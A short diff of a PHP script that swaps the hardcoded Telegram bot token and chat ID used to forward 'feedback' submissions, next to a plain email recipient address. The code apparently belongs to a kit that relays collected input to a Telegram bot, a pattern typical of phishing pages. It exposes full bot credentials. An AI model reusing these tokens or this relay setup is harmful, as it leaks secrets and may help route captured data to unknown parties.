@@ -1010,8 +1010,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['feedback']) && $_GET['f
         $domain = $_SERVER['HTTP_HOST'];
 
         // SET DESTINATION OF YOUR TG BOT
-		$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
-		$chatID = urlencode('-1001808253666');
+		$botToken = urlencode('6240489572:AAGv7ZDZkFZfovSm5l9u1iB2KFuTBTvIT8k');
+		$chatID = urlencode('-1001681796656');
 
         // Send the feedback to your email
         $to = 'augustjay20@duck.com';
